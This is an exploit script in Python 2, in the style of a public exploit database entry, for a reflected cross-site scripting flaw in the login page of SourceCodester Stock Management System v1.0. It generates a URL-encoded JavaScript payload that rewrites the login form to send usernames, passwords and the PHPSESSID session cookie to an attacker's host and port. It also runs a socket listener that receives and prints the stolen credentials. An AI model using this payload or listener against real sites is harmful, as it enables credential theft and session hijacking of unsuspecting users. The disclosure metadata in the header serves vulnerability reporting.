# Exploit Title: Stock Management System v1.0 - Cross-Site Scripting Credential Harvester (Login-Portal)
# Exploit Author: Bobby Cooke
# Date: 2020-08-01
# Vendor Homepage: https://www.sourcecodester.com/php/14366/stock-management-system-php.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/Warren%20Daloyan/stock.zip
# Version: 1.0
# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') - Type 1: Reflected XSS 
# CWE-523: Unprotected Transport of Credentials
# OWASP Top Ten 2017: A7:2017-Cross-Site Scripting (XSS)
# CVSS Base Score: 6.4 | Impact Subscore: 4.7 | Exploitability Subscore: 1.6
# CVSS v3.1 Vector: AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L
# Tested On: Windows 10 Pro + XAMPP | Python 2.7
# Vulnerability Description:
#   Reflected Cross-Site Scripting (XSS) vulnerability in 'index.php' login-portal webpage of SourceCodesters
#   Stock Management System v1.0 allows remote attackers to harvest login credentials & session cookie via 
#   unauthenticated victim clicking malicious URL and entering credentials.

import socket,sys,urllib,re
from thread import *
from colorama import Fore, Back, Style

F = [Fore.RESET,Fore.BLACK,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.BLUE,Fore.MAGENTA,Fore.CYAN,Fore.WHITE]
B = [Back.RESET,Back.BLACK,Back.RED,Back.GREEN,Back.YELLOW,Back.BLUE,Back.MAGENTA,Back.CYAN,Back.WHITE]
S = [Style.RESET_ALL,Style.DIM,Style.NORMAL,Style.BRIGHT]
info = S[3]+F[5]+'['+S[0]+S[3]+'-'+S[3]+F[5]+']'+S[0]+' '
err  = S[3]+F[2]+'['+S[0]+S[3]+'!'+S[3]+F[2]+']'+S[0]+' '
ok   = S[3]+F[3]+'['+S[0]+S[3]+'+'+S[3]+F[3]+']'+S[0]+' '

def urlEncode(javascript):
    return urllib.quote(javascript)

def genXssPayload(LHOST,LPORT):
    XSS_PAYLOAD = '/" method="post" id="loginForm"><script>'
    XSS_PAYLOAD += 'document.forms[0].action = \'/stock/index.php\';'
    XSS_PAYLOAD += 'document.forms[0].onsubmit = function sendCreds(){'
    XSS_PAYLOAD += 'var username = document.forms[0].elements[1].value;'
    XSS_PAYLOAD += 'var password = document.forms[0].elements[2].value;'
    XSS_PAYLOAD += 'var dFslash = "%2f%2f";'
    XSS_PAYLOAD += 'var uri = "http:"+decodeURIComponent(dFslash)+"'+LHOST+':'+LPORT+'/get.php?|USER="+username+"|PASS="+password+"|"+document.cookie;'
    XSS_PAYLOAD += 'xhr = new XMLHttpRequest();'
    XSS_PAYLOAD += 'xhr.open("GET", uri, true);'
    XSS_PAYLOAD += 'xhr.send();'
    XSS_PAYLOAD += 'alert("Welcome "+username+"! Sending your credentails and session to a remote attacker!");'
    XSS_PAYLOAD += '};'
    XSS_PAYLOAD += 'document.forms[0].id = \'loginForm\';'
    XSS_PAYLOAD += 'var links = document.getElementsByTagName("link");'
    XSS_PAYLOAD += 'links[0].href = "/stock/assests/bootstrap/css/bootstrap.min.css";'
    XSS_PAYLOAD += 'links[1].href = "/stock/assests/bootstrap/css/bootstrap-theme.min.css";'
    XSS_PAYLOAD += 'links[2].href = "/stock/assests/font-awesome/css/font-awesome.min.css";'
    XSS_PAYLOAD += 'links[3].href = "/stock/custom/css/custom.css";'
    XSS_PAYLOAD += 'links[4].href = "/stock/assests/jquery-ui/jquery-ui.min.css";'
    XSS_PAYLOAD += '</script><p name="DelMe'
    return XSS_PAYLOAD

def clientthread(conn):
    try:
        while True:
            data = conn.recv(1024)
            user = re.findall(r'USER=\w*',data)
            user = re.sub('^USER=','',user[0])
            print(ok+S[3]+"USERNAME:  "+F[3]+user+F[0])
            pswd = re.findall(r'PASS=\w*',data)
            pswd = re.sub('^PASS=','',pswd[0])
            print(ok+S[3]+"PASSWORD:  "+F[3]+pswd+F[0])
            sess = re.findall(r'PHPSESSID=\w*',data)
            sess = re.sub('^PHPSESSID=','',sess[0])
            print(ok+S[3]+"PHPSESSID: "+F[3]+sess+F[0])
            if not data:
                break
    except:
        conn.close()

def formatHelp(STRING):
    return S[3]+F[2]+STRING+S[0]

def sig():
    SIG  = S[3]+F[4]+"       .-----.._       ,--.\n"
    SIG += F[4]+"       |  ..    >  ___ |  | .--.\n"
    SIG += F[4]+"       |  |.'  ,'-'"+F[2]+"* *"+F[4]+"'-. |/  /__   __\n"
    SIG += F[4]+"       |      </ "+F[2]+"*  *  *"+F[4]+" \   /   \\/   \\\n"
    SIG += F[4]+"       |  |>   )  "+F[2]+" * *"+F[4]+"   /    \\        \\\n"
    SIG += F[4]+"       |____..- '-.._..-'_|\\___|._..\\___\\\n"
    SIG += F[4]+"           _______"+F[2]+"github.com/boku7"+F[4]+"_____\n"+S[0]
    return SIG

def header():
    head = S[3]+F[2]+'       --- Stock Management System v1.0 | Reflected XSS Credential Harvester ---\n'+S[0]
    return head

if __name__ == "__main__":
    print(header())
    print(sig())
    if len(sys.argv) != 4:
        print(err+formatHelp("(+) Usage:   python %s <WEBAPP_URL> <LHOST> <LPORT>" % sys.argv[0]))
        print(err+formatHelp("(+) Example: python %s 'http://172.16.65.130/stock/' '172.16.65.1' 80" % sys.argv[0]))
        sys.exit(-1)
    WEBAPP_URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    if not re.match(r".*/$", WEBAPP_URL):
        WEBAPP_URL = WEBAPP_URL+'/'
    WEBAPP_URL = WEBAPP_URL+'index.php'
    PAYLOAD = genXssPayload(LHOST,LPORT)
    ENCODED_PAYLOAD = urlEncode(PAYLOAD)
    print(info+F[0]+'To '+S[3]+F[2]+'Harvest Credentials'+F[0]+S[0]+', have a'+F[3]+' User '+F[0]+'visit '+F[5]+'this URL'+F[0]+' and '+F[7]+'Login'+F[0]+':')
    print S[3]+F[5]+WEBAPP_URL+ENCODED_PAYLOAD+S[0]
    LPORT = int(LPORT)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LHOST,LPORT))
    print(info+"Binding to Socket.")
    s.listen(10)
    print(info+"Listening on Socket for incoming connections.")
    try:
        while 1:
            conn, addr = s.accept()
            print(ok+"Victim connected with "+addr[0]+":"+str(addr[1]))
            start_new_thread(clientthread ,(conn,))
    except:
        s.close()
        print(err+"Exiting Credential Harvester..")

